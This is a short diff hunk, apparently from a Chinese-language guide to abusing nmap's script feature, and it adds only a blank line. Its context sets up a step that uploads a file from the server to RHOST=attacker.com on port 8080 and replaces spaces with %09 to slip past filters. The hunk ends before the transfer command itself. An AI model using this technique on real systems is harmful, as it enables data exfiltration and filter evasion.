@@ -85,6 +85,7 @@ nmap --script=$TF
 
 可以看到脚本内容支持python的os模块
 1. 上传文件到服务器(替换空格为%09)
+
 ```shell
 RHOST=attacker.com
 RPORT=8080
